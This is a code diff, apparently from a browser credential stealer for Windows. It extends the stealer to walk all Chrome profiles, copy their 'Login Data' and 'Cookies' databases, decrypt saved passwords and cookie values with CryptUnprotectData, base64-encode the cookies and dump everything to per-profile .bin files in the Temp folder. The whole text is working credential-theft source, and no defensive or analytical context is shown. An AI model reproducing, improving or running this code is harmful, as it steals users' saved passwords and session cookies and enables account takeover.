@@ -5,6 +5,8 @@
 */
 #include "..\..\stdafx.h"
 
+#include "..\..\base64\base64.h"
+
 using namespace std;
 
 string strTempPath("");
@@ -116,6 +118,7 @@ stringstream getCookies(
 	rc = sqlite3_step(pStmt);
 	cout << "RC: " << rc << endl;
 	while (rc == SQLITE_ROW) {
+		string base64("<failed>");
 		string decrypted("<failed>");
 
 		DATA_BLOB encryptedPass, decryptedPass;
@@ -135,6 +138,8 @@ stringstream getCookies(
 								// used.
 				0,
 				&decryptedPass);
+
+			base64 = base64_encode((unsigned char const*)decryptedPass.pbData, decryptedPass.cbData);
 			decrypted = string((char *)decryptedPass.pbData, decryptedPass.cbData);
 		}
 		catch (...)
@@ -147,6 +152,7 @@ stringstream getCookies(
 		dump << "Host   :" << sqlite3_column_text(pStmt, 0) << endl;
 		dump << "Path   :" << (char *)sqlite3_column_text(pStmt, 1) << endl;
 		dump << "Expires:" << expires << endl;
+		dump << "Cookie :" << base64 << endl;
 		dump << "Cookie :" << decrypted << endl;
 		rc = sqlite3_step(pStmt);
 	}
@@ -158,7 +164,7 @@ stringstream getCookies(
 
 	return dump;
 }
-sqlite3* getDBHandler(char* dbFilePath) {
+sqlite3* getDBHandler(const char* dbFilePath) {
 	sqlite3 *db;
 	int rc = sqlite3_open((strTempPath + dbFilePath).c_str(), &db);
 	if (rc)
@@ -174,8 +180,10 @@ sqlite3* getDBHandler(char* dbFilePath) {
 	}
 }
 
-std::string getProfilePath(std::string path, std::string search)
+std::vector<std::string> getProfilePath(std::string path, std::string search)
 {
+	std::vector<std::string> retVal;
+
 	const CHAR* cCookiesJournal = "Cookies-journal";
 
 	WIN32_FIND_DATAA FindFileData;
@@ -191,15 +199,14 @@ std::string getProfilePath(std::string path, std::string search)
 				&& FindFileData.cFileName[1] != '.'
 			)
 			{
-				std::string profilePath(getProfilePath(path + FindFileData.cFileName + "\\", cCookiesJournal));
-				if (!profilePath.empty())
-					return profilePath;
+				std::vector<std::string> profilePaths = getProfilePath(path + FindFileData.cFileName + "\\", cCookiesJournal);
+				retVal.insert(retVal.end(), profilePaths.begin(), profilePaths.end());
 			}
 			else
 			{
 				if (0 == strcmpi(FindFileData.cFileName, cCookiesJournal))
 				{
-					return path;
+					retVal.push_back(path);
 				}
 			}
 
@@ -211,18 +218,14 @@ std::string getProfilePath(std::string path, std::string search)
 	}
 
 	//	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
-	return "";
+	return retVal;
 }
 
 //relative to chrome directory
-bool copyDB(char *source, char *dest) {
+bool copyDB(const char *source, const char *dest) {
 	//Form path for Chrome's Login Data 
 
-	std:string path = getProfilePath(std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\", "*");
-	if (path.empty())
-		path = getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data\\Default\\");
-
-	path.append(source);
+	std:string path = source;
 
 	string destPath = strTempPath + dest;
 
@@ -255,36 +258,55 @@ int deleleteDB(const char *fileName) {
 
 void PasswordRun(LPSTR lpCmdLine)
 {
+	strTempPath = string(getenv("LOCALAPPDATA")) + "\\Temp\\";
+
+	std::istringstream ss(lpCmdLine);
+	std::istream_iterator<std::string> begin(ss), end;
+
+	//putting all the tokens in the vector
+	std::vector<std::string> arrayTokens(begin, end);
+
+	std::vector<const char*> argv;
+	for (std::vector<std::string>::iterator itr = arrayTokens.begin(); itr != arrayTokens.end(); itr++)
 	{
-		strTempPath = string(getenv("LOCALAPPDATA")) + "\\Temp\\";
+		argv.push_back((*itr).c_str());
+	}
+	int argc = argv.size();
 
-		std::istringstream ss(lpCmdLine);
-		std::istream_iterator<std::string> begin(ss), end;
+	std::vector<std::string> paths = getProfilePath(std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\", "*");
+	if (paths.empty())
+		paths.push_back(getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data\\Default\\"));
 
-		//putting all the tokens in the vector
-		std::vector<std::string> arrayTokens(begin, end);
 
-		std::vector<const char*> argv;
-		for (std::vector<std::string>::iterator itr = arrayTokens.begin(); itr != arrayTokens.end(); itr++)
-		{
-			argv.push_back((*itr).c_str());
-		}
-
-		int argc = argv.size();
+	for (size_t index = 0; index < paths.size(); index++/*std::vector<std::string>::iterator itr = paths.begin(); itr != paths.end(); itr++*/)
+	{
+		string profile("Profile" + std::to_string(index));
+		std::string path = paths[index];
 
 		int rc;
 		try
 		{
-			char* tempDB = "p8791.db";
+			// stringstream class check1 
+			stringstream pathStream(path);
+
+			string segment;
+			while (std::getline(pathStream, segment, '\\'))
+			{
+				if (!segment.empty())
+					profile = segment;
+			}
+
+			std::string db = path + "Login Data";
+			std::string tempDB = "p8791.db";
 
 			// Open Database
-			cout << "Copying db ..." << endl;
-			copyDB("Login Data", tempDB);
-			sqlite3 *passwordsDB = getDBHandler(tempDB);
+			cout << "Copying from" << path << "to" << tempDB << endl;
+			copyDB(db.c_str(), tempDB.c_str());
+			sqlite3 *passwordsDB = getDBHandler(tempDB.c_str());
 			stringstream passwords = getPass(passwordsDB);
 			//	cout << passwords.str();
 
-			string fileName = strTempPath + "p8791.bin";
+			string fileName = strTempPath + "p8791-" + profile + ".bin";
 			std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
 			myfile << passwords.str();
 			myfile.close();
@@ -294,7 +316,7 @@ void PasswordRun(LPSTR lpCmdLine)
 			else
 				cout << "Failed to close DB connection" << endl;
 
-			deleleteDB(tempDB);
+			deleleteDB(tempDB.c_str());
 		}
 		catch(...)
 		{
@@ -325,13 +347,16 @@ void PasswordRun(LPSTR lpCmdLine)
 		if (flagCookies) {
 			try
 			{
-				char* tempDB = "c8791.db";
+				std::string db = path + "Cookies";
+				std::string tempDB = "c8791.db";
 
-				copyDB("Cookies", tempDB);
-				sqlite3 *cookiesDb = getDBHandler(tempDB);
+				// Open Database
+				cout << "Copying from" << path << "to" << tempDB << endl;
+				copyDB(db.c_str(), tempDB.c_str());
+				sqlite3 *cookiesDb = getDBHandler(tempDB.c_str());
 				stringstream cookies = getCookies(cookiesDb);
 
-				string fileName = strTempPath + "c8791.bin";
+				string fileName = strTempPath + "c8791-" + profile + ".bin";
 				std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
 				myfile << cookies.str();
 				myfile.close();
@@ -341,7 +366,7 @@ void PasswordRun(LPSTR lpCmdLine)
 				else
 					cout << "Failed to close DB connection" << endl;
 
-				deleleteDB(tempDB);
+				deleleteDB(tempDB.c_str());
 			}
 			catch(...)
 			{
